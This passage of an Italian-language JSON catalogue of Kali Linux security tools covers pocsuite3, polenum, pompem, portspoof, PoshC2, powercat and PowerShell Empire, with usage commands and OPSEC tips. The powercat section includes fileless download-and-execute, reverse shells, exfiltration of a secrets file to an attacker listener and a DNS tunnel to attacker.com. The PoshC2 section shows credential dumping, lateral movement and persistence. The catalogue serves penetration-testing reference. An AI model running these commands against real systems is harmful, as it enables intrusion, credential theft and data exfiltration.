scan più discreti.</p><p><strong>No Stealth Options:</strong> Pnscan esegue solo TCP connect scan completo (three-way handshake). Non supporta SYN scan, FIN scan, o altre tecniche evasive. Per scan stealth, nmap è più appropriato.</p><p><strong>Logging:</strong> Ogni connessione TCP completata viene loggata dai servizi target e potenzialmente dai firewall/IDS di rete. L'IP sorgente è sempre visibile senza opzioni di spoofing.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Infrastructure",
      "Port_Scanning"
    ],
    "notes": null
  },
  {
    "id": "pocsuite3",
    "name": "pocsuite3",
    "version": "2.1.0",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/pocsuite3/",
    "desc": "Framework remoto per sviluppo e test di exploit PoC con integrazione Shodan/Fofa.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Pocsuite3</strong> è un framework open-source sviluppato dal team Knownsec 404 per lo sviluppo, il test e la gestione di exploit Proof-of-Concept (PoC). Scritto in Python 3, fornisce un'architettura strutturata per creare moduli di exploit riproducibili e testabili, con tre modalità operative: <strong>verify</strong> (conferma se la vulnerabilità esiste), <strong>attack</strong> (sfrutta la vulnerabilità), e <strong>shell</strong> (ottiene accesso interattivo). L'integrazione nativa con motori di ricerca IoT come Shodan, Fofa, ZoomEye e Censys permette di scoprire target vulnerabili direttamente dall'interno del framework, senza dover usare tool separati per l'enumerazione.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Structured PoC Development:</strong> Ogni PoC è un modulo Python con classe che eredita da POCBase. Metodi standardizzati (_verify, _attack, _shell) garantiscono consistenza. Il framework gestisce networking, error handling, e output, lasciando al ricercatore solo la logica dell'exploit.</p><p><strong>Search Engine Integration:</strong> Query dirette a Shodan, Fofa, ZoomEye, Censys via API key configurabili. Il framework scarica i risultati, estrae gli IP/URL, e li usa automaticamente come target list. Permette di passare da un CVE alla lista di host vulnerabili in un singolo comando.</p><p><strong>Three Operating Modes:</strong> Verify controlla l'esistenza della vulnerabilità senza exploit (safe testing). Attack sfrutta la vulnerabilità per ottenere dati o eseguire comandi. Shell tenta di ottenere una reverse/bind shell interattiva sul target.</p><p><strong>Batch Processing:</strong> Supporta liste di target da file, range CIDR, e risultati di motori di ricerca. Thread pool configurabile per test paralleli. Risultati aggregati in report JSON/CSV per analisi successiva.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Pocsuite3 si usa da CLI con il comando <code>pocsuite</code> o <code>poc-console</code> per modalità interattiva.</p><pre><code># Verify vulnerabilità su singolo target\npocsuite -r exploits/cve_2021_44228_log4shell.py \\\n  -u http://target.com --verify\n\n# Attack mode con exploit\npocsuite -r exploits/cve_2023_25690.py \\\n  -u https://target.com --attack\n\n# Shell mode - ottieni reverse shell\npocsuite -r exploits/rce_poc.py -u target.com \\\n  --shell --lhost 10.0.0.5 --lport 4444\n\n# Scan lista target da file\npocsuite -r poc.py -f targets.txt --verify --threads 20\n\n# Discovery via Shodan + verify automatico\npocsuite -r poc.py --dork 'Apache 2.4.49' \\\n  --dork-shodan --shodan-token YOUR_API_KEY --verify\n\n# Discovery via Fofa\npocsuite -r poc.py --dork 'app=\"Jenkins\"' \\\n  --dork-fofa --fofa-user user --fofa-token token\n\n# Console interattiva\npoc-console\nPocsuite3 > use exploits/cve_2021_44228.py\nPocsuite3 > set target http://victim.com\nPocsuite3 > run\n\n# Output report in JSON\npocsuite -r poc.py -f targets.txt --verify \\\n  --report report.json</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Vulnerability Research</strong>, pocsuite3 fornisce il framework ideale per sviluppare PoC riproducibili. La struttura standardizzata facilita la condivisione con il team e la documentazione delle vulnerabilità scoperte. I moduli possono essere versionati e mantenuti nel tempo.</p><p>Per <strong>Mass Vulnerability Assessment</strong>, l'integrazione con motori di ricerca IoT permette di valutare l'impatto reale di una vulnerabilità su scala Internet. Un ricercatore può stimare il numero di host vulnerabili a un nuovo CVE in pochi minuti.</p><p>Per <strong>Bug Bounty</strong>, automatizza il test di vulnerabilità note su scope ampi. La modalità verify è particolarmente utile per confermare rapidamente la presenza di CVE noti senza causare danni.</p><p>Per <strong>Penetration Testing</strong>, la libreria di PoC pre-esistenti accelera la fase di exploitation. I moduli possono essere customizzati per adattarsi a configurazioni specifiche del target.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Search Engine Attribution:</strong> Le query a Shodan, Fofa, ZoomEye sono associate all'API key usata. I provider loggano tutte le ricerche. In operazioni sensibili, usare API key dedicate non riconducibili all'operatore.</p><p><strong>Target Logging:</strong> Anche in modalità verify, le richieste HTTP/TCP al target lasciano tracce nei log. User-agent di default contiene 'pocsuite', modificarlo per ridurre il fingerprinting.</p><p><strong>Attack Mode Risks:</strong> La modalità attack esegue exploit reali che possono causare instabilità o danni al target. Usare sempre verify prima di attack, e solo su target autorizzati.</p><p><strong>Module Trust:</strong> I moduli PoC scaricati dalla community potrebbero contenere codice malevolo. Sempre revisionare il codice sorgente di moduli di terze parti prima dell'esecuzione.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "General"
    ],
    "notes": null
  },
  {
    "id": "polenum",
    "name": "polenum",
    "version": "1.6.1",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/polenum/",
    "desc": "Estrae password policy da domain controller Windows via RPC anonimo o autenticato.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Polenum</strong> è un tool Python specializzato nell'estrazione della password policy da domini Active Directory tramite il protocollo MS-SAMR (Security Account Manager Remote). Può operare in modalità null session (senza credenziali, se il DC lo permette) o autenticata, e rivela informazioni critiche per pianificare attacchi basati su password: lunghezza minima richiesta, requisiti di complessità, history (quante password precedenti non possono essere riutilizzate), età massima/minima, e soprattutto le impostazioni di account lockout (threshold, duration, observation window). Queste informazioni sono fondamentali per calibrare attacchi di password spraying evitando lockout massivi.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Null Session Support:</strong> Tenta prima l'enumerazione anonima via sessione SMB null. Su domain controller legacy o misconfigured, questo può funzionare senza alcuna credenziale, rivelando policy senza lasciare tracce associate a un account.</p><p><strong>Authenticated Mode:</strong> Con credenziali di dominio valide (anche utente standard), estrae policy complete. Usa il protocollo SAMR per query al Security Account Manager del DC.</p><p><strong>Complete Policy Extraction:</strong> Recupera tutti i parametri: MinPasswordLength, PasswordComplexity, PasswordHistoryLength, MinPasswordAge, MaxPasswordAge, LockoutThreshold, LockoutDuration, LockoutObservationWindow.</p><p><strong>Scriptable Output:</strong> Output testuale parsabile per integrazione in workflow automatizzati. Può essere usato in combinazione con tool di password spraying per auto-configurare rate limiting.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Polenum richiede raggiungibilità del DC su porta 445 (SMB) e 135 (RPC).</p><pre><code># Tentativo con null session (no credenziali)\npolenum -d corp.local -u '' -p '' --dc dc.corp.local\n# Funziona solo se DC permette anonymous enumeration\n\n# Con credenziali domain user\npolenum -d corp.local -u normaluser -p 'Password123' --dc 192.168.1.10\n\n# Specifica solo DC (autodiscover domain)\npolenum --dc dc.corp.local -u user -p pass\n\n# Output tipico:\n# [+] Minimum Password Length: 8\n# [+] Password Complexity: Enabled\n# [+] Password History Length: 24\n# [+] Maximum Password Age: 90 days\n# [+] Minimum Password Age: 1 day\n# [+] Account Lockout Threshold: 5\n# [+] Account Lockout Duration: 30 minutes\n# [+] Lockout Observation Window: 30 minutes\n\n# Uso delle info per password spraying sicuro\n# Se threshold=5 e window=30min:\n# Spraya max 4 password ogni 30 minuti per evitare lockout</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Prima di <strong>Password Spraying</strong>, polenum è essenziale per conoscere il lockout threshold. Spraying cieco può bloccare centinaia di account causando DoS e alert massivi. Conoscendo threshold e observation window, si calibra l'attacco per rimanere sotto la soglia.</p><p>Durante <strong>Active Directory Enumeration</strong>, la password policy rivela la security posture: lunghezza minima 8 senza complessità è debole, threshold 0 (no lockout) è critico, history corta permette password cycling.</p><p>Per <strong>Security Audit</strong>, verifica che policy aziendali dichiarate siano effettivamente implementate. Confronta policy estratta con baseline di sicurezza (NIST, CIS) per identificare gap.</p><p>Nella <strong>Credential Attack Planning</strong>, requisiti di complessità guidano la scelta delle wordlist. Policy che richiede maiuscola+minuscola+numero+speciale restringe lo spazio di ricerca rispetto a solo lunghezza minima.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>RPC Logging:</strong> Query SAMR vengono loggate sul domain controller (Event ID 4661, 4662). L'account usato per l'autenticazione appare nei log. In operazioni stealth, usare account compromessi sacrificabili.</p><p><strong>Null Session Raramente Funziona:</strong> Domain controller Windows Server 2012+ bloccano enumeration anonima di default. La null session funziona principalmente su DC legacy o misconfigured.</p><p><strong>SIEM Detection:</strong> Query SAMR da workstation non-admin possono triggerare alert in ambienti monitorati. Pattern: utente standard che enumera policy da macchina insolita.</p><p><strong>Alternative:</strong> Con credenziali, `net accounts /domain` o PowerShell `Get-ADDefaultDomainPasswordPolicy` ottengono le stesse info. LDAP query su attributi di dominio è metodo alternativo.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Enumeration",
      "Infrastructure",
      "LDAP_AD"
    ],
    "notes": null
  },
  {
    "id": "pompem",
    "name": "pompem",
    "version": "0.2.0",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/pompem/",
    "desc": "Cerca exploit per software specifico su multiple fonti: Exploit-DB, PacketStorm, NVD.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Pompem</strong> è un tool Python per la ricerca automatizzata di exploit pubblici, che aggrega risultati da multiple fonti online simultaneamente: Exploit-DB, PacketStorm Security, WPScan Vulnerability Database (per WordPress), e altri repository. A differenza di searchsploit che cerca in un database locale, Pompem interroga le API e fa scraping dei siti in tempo reale, garantendo risultati sempre aggiornati. Particolarmente utile quando si hanno software e versioni specifiche da verificare: Pompem trova rapidamente tutti i PoC (Proof of Concept) pubblicamente disponibili, con link diretti per il download.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Multi-Source Aggregation:</strong> Ricerca parallela su Exploit-DB, PacketStorm, WPScan VulnDB, e altri. I risultati vengono deduplicati e presentati in formato unificato con riferimenti alle fonti originali.</p><p><strong>Intelligent Matching:</strong> Ricerca fuzzy che trova exploit anche con variazioni nel naming. Cerca per prodotto, versione, vendor, o combinazioni. Utile quando non si conosce la nomenclatura esatta usata nei database.</p><p><strong>Structured Output:</strong> Risultati formattati con titolo exploit, tipo (remote/local/webapp/dos), piattaforma, e URL diretto. Output salvabile in file per documentazione o parsing successivo.</p><p><strong>WordPress Specialization:</strong> Integrazione con WPScan VulnDB per ricerche specifiche su plugin, temi, e core WordPress. Database dedicato con vulnerabilità WordPress non sempre presenti su Exploit-DB.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Pompem richiede connessione internet per interrogare i database online.</p><pre><code># Ricerca exploit per software e versione\npompem -s \"Apache 2.4.49\"\npompem -s \"OpenSSH 7.2p2\"\npompem -s \"ProFTPD 1.3.5\"\n\n# Ricerca WordPress plugin vulnerabili\npompem -s \"WordPress contact form 7\"\npompem -s \"WordPress elementor\"\npompem -s \"WordPress woocommerce\"\n\n# Ricerca per prodotto generico\npompem -s \"nginx\"\npompem -s \"tomcat\"\n\n# Salva risultati su file\npompem -s \"Drupal 7\" -o drupal_exploits.txt\n\n# Filtro per tipo di exploit\npompem -s \"apache\" --type remote\npompem -s \"linux kernel\" --type local\n\n# Output tipico:\n# [+] Exploit-DB Results:\n#     Apache 2.4.49 - Path Traversal & RCE (CVE-2021-41773)\n#     https://www.exploit-db.com/exploits/50383\n#     Type: Remote | Platform: Multiple\n#\n# [+] PacketStorm Results:\n#     Apache HTTP Server 2.4.49 Path Traversal\n#     https://packetstormsecurity.com/files/164418/\n\n# Workflow tipico post-enumeration\nnmap -sV target.com -oG - | grep open | \\\n  awk '{print $3\" \"$4}' | while read svc ver; do\n    pompem -s \"$svc $ver\"\n  done</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Durante <strong>Vulnerability Assessment</strong>, dopo aver identificato versioni software con nmap o altri scanner, Pompem verifica rapidamente se esistono exploit pubblici. Un software con exploit pubblico richiede patching prioritario.</p><p>Nel <strong>Penetration Testing</strong>, la fase di ricerca exploit è semplificata: invece di cercare manualmente su ogni database, Pompem aggrega tutto in un'unica query.</p><p>Per <strong>Security Research</strong>, tracking di exploit pubblicati per specifici software. Utile per monitorare lo stato di vulnerabilità di prodotti specifici nel tempo.</p><p>Durante <strong>Patch Prioritization</strong>, aiuta i team di sicurezza a identificare quali sistemi hanno exploit pubblicamente disponibili e richiedono patching urgente rispetto a vulnerabilità solo teoriche.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Query Pubbliche:</strong> Le ricerche vengono inviate a server esterni. I provider potrebbero loggare le query. In contesti sensibili, considerare se rivelare gli interessi di ricerca.</p><p><strong>Exploit Verification:</strong> Gli exploit trovati provengono da fonti pubbliche e potrebbero essere obsoleti, non funzionanti, o contenere codice malevolo. Sempre verificare e testare in ambiente controllato.</p><p><strong>Rate Limiting:</strong> Query frequenti possono essere rate-limited dai provider. Pompem non ha throttling integrato, usare con moderazione.</p><p><strong>Coverage Gaps:</strong> Non tutti i database exploit sono coperti. Exploit recenti o di nicchia potrebbero non essere indicizzati. Complementare con ricerche manuali su GitHub, Twitter, e advisory vendor.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Vulnerability_Scanning"
    ],
    "notes": null
  },
  {
    "id": "portspoof",
    "name": "portspoof",
    "version": "1.3",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/portspoof/",
    "desc": "Honeypot che risponde su tutte le porte TCP con fake services per confondere scanner.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Portspoof</strong> è un tool di cyber deception che implementa una strategia anti-reconnaissance rispondendo su tutte le 65535 porte TCP con banner di servizi fake. Quando un attaccante esegue un port scan contro un sistema protetto da Portspoof, ogni porta appare aperta e risponde con signature di servizi diversi (Apache, SSH, MySQL, etc.), rendendo i risultati dello scan completamente inutilizzabili. Questo approccio inverte il vantaggio tipico dell'attaccante: invece di dover proteggere poche porte, il difensore nasconde i servizi reali in un mare di rumore. Portspoof funziona come honeypot distribuito su tutto lo spazio porte, loggando ogni tentativo di connessione per threat intelligence.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Universal Port Response:</strong> Un singolo processo risponde su tutte le 65535 porte TCP grazie a regole iptables che redirigono tutto il traffico. Ogni connessione riceve una risposta apparentemente legittima, facendo sembrare ogni porta come hosting un servizio attivo.</p><p><strong>Configurable Fake Banners:</strong> Database di signature di servizi reali (HTTP headers, SSH banners, FTP greetings, etc.). Può rispondere con banner casuali o seguire pattern configurabili. Le signature sono sufficientemente realistiche da ingannare nmap service detection.</p><p><strong>Scanner Confusion:</strong> Tool come nmap ricevono 65535 porte \"open\" con servizi diversi. L'output diventa inutilizzabile: impossibile distinguere i veri servizi dai fake. Aumenta drasticamente il tempo e il rumore necessario per reconnaissance efficace.</p><p><strong>Connection Logging:</strong> Ogni tentativo di connessione viene loggato con timestamp, IP sorgente, porta destinazione, e dati inviati. Fornisce early warning di scan in corso e intelligence su tecniche usate dagli attaccanti.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Portspoof richiede configurazione iptables per redirigere il traffico al processo listener.</p><pre><code># Setup iptables per redirect tutto il traffico TCP al listener\nsudo iptables -t nat -A PREROUTING -i eth0 -p tcp \\\n  --dport 1:65535 -j REDIRECT --to-port 4444\n\n# Avvio Portspoof in daemon mode\nsudo portspoof -c /etc/portspoof/portspoof.conf \\\n  -s /etc/portspoof/portspoof_signatures -D\n\n# Con logging verboso su file\nsudo portspoof -l /var/log/portspoof.log \\\n  -c /etc/portspoof/portspoof.conf \\\n  -s /etc/portspoof/portspoof_signatures\n\n# Listener su porta custom\nsudo portspoof -p 8080 -c portspoof.conf -s signatures\n\n# Test da altra macchina\nnmap -sV -p1-1000 target\n# Output: tutte le porte \"open\" con servizi diversi\n\n# Escludere porte reali dal redirect\n# Prima permettere traffico ai servizi reali:\nsudo iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 22 -j ACCEPT\nsudo iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 -j ACCEPT\nsudo iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 443 -j ACCEPT\n# Poi redirect il resto:\nsudo iptables -t nat -A PREROUTING -i eth0 -p tcp \\\n  --dport 1:65535 -j REDIRECT --to-port 4444\n\n# Cleanup regole iptables\nsudo iptables -t nat -F PREROUTING</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Active Defense</strong>, Portspoof rende la reconnaissance phase dell'attaccante estremamente frustrante. Anche scan completi producono output inutilizzabile, rallentando significativamente la kill chain.</p><p>Come <strong>Distributed Honeypot</strong>, ogni connessione a porte non-service viene loggata. Alert immediato quando qualcuno scansiona il sistema. I log rivelano IP attaccanti, timing patterns, e potenzialmente tool usati.</p><p>Per <strong>Deception Operations</strong>, può essere combinato con altri tool di deception per creare ambienti che confondono e rallentano attaccanti, dando tempo ai difensori di reagire.</p><p>Durante <strong>Red Team Testing</strong>, Portspoof testa l'efficacia dei tool di reconnaissance del red team e la loro capacità di distinguere servizi reali da fake.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Resource Usage:</strong> Gestire potenzialmente migliaia di connessioni simultanee richiede risorse. Tuning necessario per ambienti ad alto volume. Memory e CPU usage da monitorare.</p><p><strong>Fingerprinting Possible:</strong> Attaccanti esperti possono riconoscere Portspoof da pattern nelle risposte: timing troppo uniforme, banner non del tutto coerenti, o comportamento non standard. Versioni recenti migliorano il realismo.</p><p><strong>Service Interference:</strong> Se le regole iptables non sono configurate correttamente, Portspoof può intercettare traffico destinato a servizi legittimi. Sempre escludere le porte dei servizi reali prima di attivare il redirect.</p><p><strong>Legal Consideration:</strong> In alcune giurisdizioni, tool di deception possono avere implicazioni legali se usati per ingannare utenti legittimi. Usare in contesti autorizzati.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "04_Red_Team",
      "Evasion"
    ],
    "notes": null
  },
  {
    "id": "poshc2",
    "name": "poshc2",
    "version": "9.0",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/poshc2/",
    "desc": "Framework C2 con implant PowerShell, C#, Python per operazioni red team avanzate.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>PoshC2</strong> è un framework Command and Control (C2) open-source proxy-aware progettato per red team e penetration testing. Sviluppato da Nettitude, fornisce un'infrastruttura completa per gestire operazioni post-exploitation con implant multi-linguaggio: PowerShell per ambienti Windows legacy, C# (Sharp) per .NET moderno con bypass AMSI, e Python per target Linux/macOS. Il server C2 utilizza comunicazione HTTPS con certificati personalizzabili e profili di comunicazione configurabili per mimetizzare traffico legittimo. PoshC2 supporta operazioni multi-operatore, permettendo a più membri del team di interagire simultaneamente con gli implant attivi attraverso un'interfaccia client condivisa.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Multi-Language Implants:</strong> Genera payload in PowerShell (PoshC2 classico), C# (Sharp implant per .NET), e Python (per Linux/macOS). Ogni tipo di implant ha moduli post-exploitation dedicati. Gli Sharp implant bypassano PowerShell Constrained Language Mode e AMSI.</p><p><strong>Proxy-Aware Communication:</strong> Gli implant rilevano e utilizzano automaticamente i proxy aziendali configurati sul sistema target. Supporta autenticazione NTLM al proxy, permettendo comunicazione C2 anche in ambienti corporate con internet filtrato.</p><p><strong>Modular Post-Exploitation:</strong> Libreria integrata di moduli: Mimikatz per credential dumping, SharpHound per AD enumeration, Seatbelt per situational awareness, persistence mechanisms, lateral movement via WMI/PSExec/DCOM. Moduli caricabili on-demand per minimizzare il footprint iniziale.</p><p><strong>Multi-Operator Support:</strong> Più operatori possono connettersi simultaneamente al server C2 via posh-client. Ogni operatore vede i comandi degli altri, facilitando coordinazione in team. Task queue condivisa con logging completo delle azioni.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>PoshC2 richiede setup iniziale del server, configurazione, generazione payload, e poi connessione client.</p><pre><code># 1. Configurazione iniziale\nposh-config  # Configura URL C2, porte, certificati, kill date\n\n# 2. Avvio server C2\nsudo posh-server  # Avvia HTTPS listener\n\n# 3. Generazione implant/payload\nposh-implantgen  # Genera tutti i tipi di payload:\n# - PowerShell one-liner\n# - C# Sharp dropper (.exe)\n# - Python implant\n# - HTA / macro per phishing\n# - Shellcode raw\n\n# 4. Connessione al framework come operatore\nposh-client\n\n# 5. Comandi su implant attivo\nPoshC2 > list-implants\nPoshC2 > use 1\nPoshC2 (implant-1) > seatbelt -group=all\nPoshC2 (implant-1) > loadmodule Invoke-Mimikatz.ps1\nPoshC2 (implant-1) > invoke-mimikatz\n\n# Lateral movement\nPoshC2 (implant-1) > invoke-wmiexec -target DC01 -command 'cmd'\n\n# Persistence\nPoshC2 (implant-1) > install-persistence -method registry\n\n# Sharp implant (C#)\nPoshC2 (sharp-1) > sharphound -collectionmethod all\nPoshC2 (sharp-1) > rubeus kerberoast</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Red Team Operations</strong>, PoshC2 fornisce l'infrastruttura C2 completa per operazioni di lunga durata. La varietà di implant permette di adattarsi a diversi ambienti target. Il supporto multi-operatore è essenziale per team che lavorano in parallelo su diversi segmenti di rete.</p><p>Per <strong>Adversary Simulation</strong>, i moduli integrati permettono di emulare TTP di threat actors reali. È possibile replicare kill chain complete: initial access via phishing con macro, discovery con Seatbelt, credential access con Mimikatz, lateral movement con WMI.</p><p>Per <strong>Purple Team Exercises</strong>, le operazioni PoshC2 generano telemetria rilevabile da EDR/SIEM. Il blue team può utilizzare i log delle operazioni per validare detection rules e migliorare le capacità di risposta.</p><p>Per <strong>Penetration Testing</strong>, post-exploitation strutturata con persistenza, privilege escalation, e data exfiltration. Più organizzato e tracciabile rispetto a tool singoli.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Signature Detection:</strong> Gli implant PoshC2 hanno signature note in molti EDR e antivirus. C# Sharp implant ha detection rate minore rispetto a PowerShell, ma non è immune. Obfuscation e custom build sono necessari per ambienti protetti.</p><p><strong>C2 Traffic Patterns:</strong> Il beaconing periodico degli implant può essere rilevato da network monitoring. Jitter configurabile randomizza gli intervalli, ma analisi statistiche a lungo termine possono identificare il pattern.</p><p><strong>Server Infrastructure:</strong> Il server C2 deve essere protetto: compromissione del server espone tutti gli implant e le credenziali raccolte. Usare redirector/domain fronting per nascondere il server reale.</p><p><strong>Operational Logging:</strong> PoshC2 logga tutti i comandi eseguiti da tutti gli operatori. Assicurarsi che i log siano protetti e cancellati appropriatamente al termine dell'engagement.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "04_Red_Team",
      "C2_Frameworks"
    ],
    "notes": null
  },
  {
    "id": "powercat",
    "name": "powercat",
    "version": "0.0~git20240305.4e33fdf",
    "icon": "../app/icons/powercat-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/powercat/",
    "desc": "Netcat in PowerShell: trasferimento file, shell, relay TCP con funzionalità avanzate.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Powercat</strong> è una reimplementazione completa di netcat (nc) in puro PowerShell, creata da besimorhino. Essendo uno script .ps1 senza dipendenze da binari esterni, può essere eseguito su qualsiasi sistema Windows con PowerShell senza installare software aggiuntivo. Fornisce tutte le funzionalità classiche di netcat — connessioni TCP/UDP, reverse shell, bind shell, file transfer, port relay — più funzionalità PowerShell-native come la generazione di payload encoded in base64 per one-liner di delivery. È uno dei tool più utilizzati in post-exploitation su Windows perché non richiede il upload di eseguibili (che verrebbero rilevati da AV), operando interamente in memoria tramite import diretto.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Reverse/Bind Shell:</strong> Crea shell interattive sia in modalità reverse (il target si connette all'attaccante) che bind (il target apre una porta locale). Supporta sia cmd.exe che powershell.exe come shell, con la possibilità di specificare qualsiasi eseguibile.</p><p><strong>Relay Mode:</strong> Agisce come TCP relay/port forwarder, inoltrando connessioni tra due endpoint. Essenziale per pivoting: un host compromesso nella DMZ può inoltrare traffico dalla rete esterna alla rete interna, permettendo di raggiungere target altrimenti inaccessibili.</p><p><strong>Payload Generation:</strong> Genera payload PowerShell encoded in base64 per delivery in one-liner. Il payload contiene lo script powercat completo e i parametri di connessione, pronto per essere eseguito con <code>powershell -e [base64]</code> senza bisogno di salvare file su disco.</p><p><strong>File Transfer:</strong> Trasferisce file in entrambe le direzioni via connessioni TCP. Supporta modalità input da file (-i) e output su file (-of), permettendo upload/download di file tra attaccante e target senza tool aggiuntivi.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Powercat viene importato in memoria direttamente dalla rete o da disco.</p><pre><code># Import in memoria (fileless)\nIEX (New-Object Net.WebClient).DownloadString('http://10.0.0.5/powercat.ps1')\n\n# Oppure da disco\nImport-Module .\\powercat.ps1\n\n# Reverse shell verso listener attaccante\n# Attaccante: nc -lvp 4444\npowercat -c 10.0.0.5 -p 4444 -e cmd.exe\n\n# Reverse shell PowerShell (più funzionalità)\npowercat -c 10.0.0.5 -p 4444 -ep\n\n# Bind shell - apri porta locale\npowercat -l -p 8080 -e cmd.exe\n# Attaccante: nc target_ip 8080\n\n# File transfer - invio file\npowercat -c 10.0.0.5 -p 9999 -i C:\\Users\\admin\\secrets.txt\n# Attaccante: nc -lvp 9999 > secrets.txt\n\n# File transfer - ricezione file\npowercat -l -p 9999 -of C:\\temp\\payload.exe\n# Attaccante: nc target_ip 9999 < payload.exe\n\n# Relay/Pivot - forward porta locale a target interno\npowercat -l -p 8080 -r tcp:192.168.1.100:80\n\n# Genera payload encoded per one-liner delivery\npowercat -c 10.0.0.5 -p 4444 -e cmd.exe -ge > payload.b64\n# Esegui payload: powershell -e [contenuto_file]\n\n# DNS tunnel mode (se supportato)\npowercat -c 10.0.0.5 -p 53 -dns attacker.com -e cmd.exe</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Post-Exploitation Shell Access</strong>, powercat è il metodo preferito per ottenere shell interattive su Windows senza scaricare eseguibili. L'import in memoria evita di toccare il disco, riducendo le tracce forensi e il rischio di detection AV basata su file.</p><p>Per <strong>Network Pivoting</strong>, la modalità relay trasforma un host compromesso in un port forwarder. Catene di relay attraverso più host permettono di raggiungere reti segmentate profonde, con ogni hop gestito da un'istanza powercat.</p><p>Per <strong>Data Exfiltration</strong>, il file transfer integrato permette di estrarre documenti, database, credenziali senza necessità di tool separati. Particolarmente utile quando tool come certutil sono monitorati.</p><p>Per <strong>Payload Staging</strong>, la generazione di payload encoded crea one-liner autocontenuti per delivery via phishing, macro Office, o injection in processi. Il payload decodifica ed esegue powercat interamente in memoria.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>AMSI Detection:</strong> Le versioni non modificate di powercat sono rilevate da AMSI (Antimalware Scan Interface) in Windows 10+. Richiede obfuscation dello script o bypass AMSI prima dell'import per evitare blocco immediato.</p><p><strong>Script Block Logging:</strong> PowerShell 5.0+ logga il contenuto completo degli script eseguiti (Event ID 4104). L'intero codice di powercat e i comandi eseguiti appaiono nei log, rivelando IP, porte, e azioni dell'attaccante.</p><p><strong>Network Indicators:</strong> Le connessioni TCP raw di powercat non sono crittografate. Traffic inspection rivela comandi e output in chiaro. Per comunicazioni sicure, usare tunnel SSH o wrapper SSL.</p><p><strong>Process Lineage:</strong> PowerShell che esegue connessioni di rete e spawn di cmd.exe è un pattern altamente sospetto per EDR. La catena di processi (powershell → cmd) è una detection classica.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Pivoting"
    ],
    "notes": null
  },
  {
    "id": "powershell-empire",
    "name": "powershell-empire",
    "version": "6.1.2",
    "icon": "../app/icons/powershell-empire-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/powershell-empire/",
    "desc": "Framework C2 post-exploitation con agent PowerShell/Python, moduli e evasion integrata.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>PowerShell Empire</strong> (ora mantenuto da BC Security) è uno dei framework C2 post-exploitation più maturi e completi disponibili. Originariamente creato dal team di Veris Group, Empire fornisce agent in PowerShell (per Windows) e Python (per Linux/macOS) con oltre 400 moduli che coprono ogni aspetto della post-exploitation: credential harvesting, privilege escalation, lateral movement, persistence, situational awareness, ed exfiltration. L'architettura client-server permette operazioni multi-operatore, mentre il sistema di listener supporta diversi protocolli di comunicazione (HTTP, HTTPS, malleable C2) con profili configurabili per mimetizzare traffico legittimo. Empire 5+ ha introdotto Starkiller, una GUI web moderna che semplifica la gestione delle operazioni.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Extensive Module Library:</strong> Oltre 400 moduli organizzati per categoria: collection (keylogger, screenshot, clipboard), credentials (Mimikatz, Kerberoast, DCSync), lateral_movement (PSExec, WMI, DCOM, WinRM), persistence (registry, scheduled task, WMI subscription), privesc 